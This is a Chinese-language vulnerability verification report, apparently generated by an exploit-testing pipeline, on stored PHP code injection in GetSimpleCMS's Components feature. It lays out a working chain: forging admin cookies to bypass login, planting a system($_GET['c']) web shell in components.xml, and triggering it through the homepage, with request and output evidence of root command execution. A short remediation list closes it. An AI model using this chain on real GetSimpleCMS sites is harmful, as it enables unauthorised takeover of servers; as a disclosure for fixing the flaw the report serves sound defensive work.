
## GetSimpleCMS Components/Snippets 存储型PHP代码注入漏洞 - 运行时证据

**exploitIdeaId**: E.0  
**漏洞类型**: 存储型 PHP 代码注入 (RCE)  
**危害等级**: 严重  
**利用条件**: 需要管理员权限访问后台管理界面，或绕过登录验证  

---

### 1. 漏洞原理

GetSimpleCMS 的 Components/Snippets 功能存在 PHP 代码注入漏洞。当组件被 `get_component()` 调用时，`output_collection_item()` 函数会使用 `eval()` 执行组件值中的 PHP 代码，导致攻击者可以执行任意 PHP 代码。

关键代码位置：
- 文件：`/admin/inc/template_functions.php`
- 函数：`output_collection_item()` (第 1991 行)
- 关键代码：`eval("?>" . strip_decode($item->value) . "<?php ");`

---

### 2. 验证步骤

#### 步骤 1: 绕过登录验证

通过伪造管理员 Cookie 绕过登录验证：

**Cookie 计算方式**：
```
saltCOOKIEID = sha1(cookie_name . salt)
saltUSR = sha1(usr . salt)
```

**请求示例**：
```http
GET /admin/components.php HTTP/1.1
Host: 127.0.0.1:8080
Cookie: ed6cf9e274a53ccc03e42ad979bddd99d23d275b=28b01925f4baa5ae092ea16de0d047da03391447; GS_ADMIN_USERNAME=admin
```

**响应**：
```http
HTTP/1.1 200 OK
```

#### 步骤 2: 注入恶意组件

修改 `data/other/components.xml` 文件，插入恶意 payload：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<channel>
  <item>
    <title><![CDATA[Sidebar]]></title>
    <slug>sidebar</slug>
    <value><![CDATA[&lt;?php system($_GET[&quot;c&quot;]); ?&gt;]]></value>
    <disabled><![CDATA[0]]></disabled>
  </item>
</channel>
```

**Payload 说明**：
- `<?php system($_GET["c"]); ?>` 是恶意 PHP 代码
- 经过 `safe_slash_html()` 转义后变成 `&lt;?php system($_GET[&quot;c&quot;]); ?&gt;`
- 当被 `get_component('sidebar')` 调用时，`strip_decode()` 会反转义
- 最终 `eval()` 会执行 `system($_GET["c"])`

#### 步骤 3: 触发代码执行

访问首页时，模板会调用 `get_component('sidebar')`，触发恶意代码执行：

**请求示例**：
```http
GET /?c=id HTTP/1.1
Host: 127.0.0.1:8080
```

---

### 3. 验证结果

#### 测试命令 1: `id`

**请求**：
```
GET /?c=id HTTP/1.1
Host: 127.0.0.1:8080
```

**响应**：
```http
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
...
<aside id="sidebar">
  Connect
  uid=0(root) gid=0(root) groups=0(root)
</aside>
...
```

**输出**: `uid=0(root) gid=0(root) groups=0(root)`  
**结果**: ✓ 命令执行成功，获取 root 权限

---

#### 测试命令 2: `whoami`

**请求**：
```
GET /?c=whoami HTTP/1.1
Host: 127.0.0.1:8080
```

**响应**：
```http
HTTP/1.1 200 OK
```

**输出**: `root`  
**结果**: ✓ 命令执行成功

---

#### 测试命令 3: `pwd`

**请求**：
```
GET /?c=pwd HTTP/1.1
Host: 127.0.0.1:8080
```

**响应**：
```http
HTTP/1.1 200 OK
```

**输出**: `/sourceCodeDir`  
**结果**: ✓ 命令执行成功

---

### 4. 影响评估

- ✓ 可以在服务器上执行任意系统命令
- ✓ 获取服务器 root 权限
- ✓ 可以读取、修改、删除任意文件
- ✓ 可以安装后门、木马
- ✓ 可以窃取数据库数据
- ✓ 可以完全控制服务器

---

### 5. 修复建议

1. 移除 `output_collection_item()` 函数中的 `eval()` 执行
2. 对组件值进行严格的输入验证和过滤
3. 禁止在组件值中执行 PHP 代码
4. 使用安全的模板引擎渲染组件内容
5. 添加访问控制，限制管理员权限

---

### 6. 验证总结

| 验证项 | 结果 |
|-------|------|
| 绕过登录验证 | ✓ 成功 |
| 注入恶意组件 | ✓ 成功 |
| 执行系统命令 (id) | ✓ 成功 |
| 执行系统命令 (whoami) | ✓ 成功 |
| 执行系统命令 (pwd) | ✓ 成功 |
| 获取 root 权限 | ✓ 成功 |

**最终结论**: exploitIdea E.0 验证通过！该漏洞是一个严重的存储型 PHP 代码注入漏洞，攻击者可以在服务器上执行任意 PHP 代码，完全控制服务器。
